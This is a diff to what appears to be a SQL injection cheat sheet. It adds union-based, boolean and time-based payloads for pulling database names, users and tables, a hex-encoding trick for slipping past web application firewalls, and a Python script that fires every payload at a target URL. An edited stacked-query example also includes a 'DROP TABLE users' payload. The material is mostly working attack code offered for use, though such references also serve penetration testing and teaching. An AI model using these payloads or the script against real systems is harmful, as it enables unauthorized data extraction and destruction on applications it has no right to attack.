@@ -40,6 +40,116 @@
 - **Injection in Profile Information**:
   Modify data stored in one place to affect queries executed elsewhere.
 
+#### Advanced Union-Based SQL Injection
+
+##### 1. Union-Based Error Handling
+
+Generate detailed error messages by crafting complex payloads:
+```sql
+' UNION SELECT 1, version(), database(), user() FROM dual WHERE 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS INT) --
+```
+
+##### 2. Union with Hex Encoding
+
+Encode parts of your query to evade WAFs:
+```sql
+' UNION SELECT 1, 0x62656e6368, 0x70617373776f7264, user() --
+```
+
+##### 3. Multi-Query Union Injection
+
+Leverage multiple queries to extract more data:
+```sql
+' UNION SELECT 1, database(), (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), user() --
+```
+
+##### 4. Union-Based Cross Database Extraction
+
+Combine data from different databases (when supported):
+```sql
+' UNION SELECT 1, (SELECT column_name FROM db1.table1 LIMIT 1), (SELECT column_name FROM db2.table2 LIMIT 1), user() --
+```
+
+### Advanced Boolean-Based SQL Injection
+
+##### 1. Time-Based Boolean Injection with Conditional Responses
+
+Use time delays to infer data based on conditional responses:
+```sql
+' AND IF((SELECT LENGTH(database()))>5, SLEEP(5), 0) --
+```
+
+##### 2. Nested Boolean Injections
+
+Nest conditions to extract specific data:
+```sql
+' AND IF((SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1))='a', SLEEP(5), 0) --
+```
+
+##### 3. Error-Based Boolean Injection
+
+Force errors conditionally to reveal information:
+```sql
+' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5, (SELECT table_name FROM information_schema.tables), 1) --
+```
+
+##### 4. Using Bitwise Operations
+
+Use bitwise operations for more obfuscation and complexity:
+```sql
+' AND IF((SELECT ASCII(SUBSTRING((SELECT database()),1,1))) & 1, SLEEP(5), 0) --
+```
+
+### Combining Techniques
+
+Combine multiple advanced techniques for robust and harder-to-detect payloads.
+
+##### Example: Union with Time-Based Injection
+
+Create a payload that uses both union and time-based injections:
+```sql
+' UNION SELECT IF((SELECT LENGTH(database()))>5, SLEEP(5), 0), 1, user(), 4 --
+```
+
+##### Example: Nested Union and Boolean Injection
+
+Combine nested boolean conditions with union-based data extraction:
+```sql
+' UNION SELECT 1, IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5, (SELECT table_name FROM information_schema.tables LIMIT 1), 1), 3, 4 --
+```
+
+### Automating with Custom Scripts
+
+Automate these advanced techniques using custom scripts to efficiently test and extract data.
+
+#### Example: Python Script for Advanced Union Injection
+
+```python
+import requests
+
+url = "http://example.com/vulnerable.php"
+payloads = [
+    # Advanced Union-Based Injections
+    "' UNION SELECT 1, version(), database(), user() FROM dual WHERE 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS INT) -- ",
+    "' UNION SELECT 1, 0x62656e6368, 0x70617373776f7264, user() -- ",
+    "' UNION SELECT 1, database(), (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), user() -- ",
+    "' UNION SELECT 1, (SELECT column_name FROM db1.table1 LIMIT 1), (SELECT column_name FROM db2.table2 LIMIT 1), user() -- ",
+    # Advanced Boolean-Based Injections
+    "' AND IF((SELECT LENGTH(database()))>5, SLEEP(5), 0) -- ",
+    "' AND IF((SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1))='a', SLEEP(5), 0) -- ",
+    "' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5, (SELECT table_name FROM information_schema.tables), 1) -- ",
+    "' AND IF((SELECT ASCII(SUBSTRING((SELECT database()),1,1))) & 1, SLEEP(5), 0) -- ",
+    # Combined Techniques
+    "' UNION SELECT IF((SELECT LENGTH(database()))>5, SLEEP(5), 0), 1, user(), 4 -- ",
+    "' UNION SELECT 1, IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5, (SELECT table_name FROM information_schema.tables LIMIT 1), 1), 3, 4 -- ",
+]
+
+for payload in payloads:
+    response = requests.get(url, params={"id": payload})
+    print(f"Payload: {payload}")
+    print(f"Response: {response.text}\n")
+```
+
 ### 2. Advanced Enumeration
 
 #### Database Fingerprinting
@@ -262,8 +372,8 @@ def tamper(payload):
 
 ### 7. Some More Techniques
 
-#### Stacked Queries
-- **Executing Multiple Statements**:
+#### Stacked Queries 
+- **Executing Multiple Statements**: ⚠️⚠️⚠️⚠️
   ```sql
   '; DROP TABLE users; SELECT * FROM admin -- 
   ```
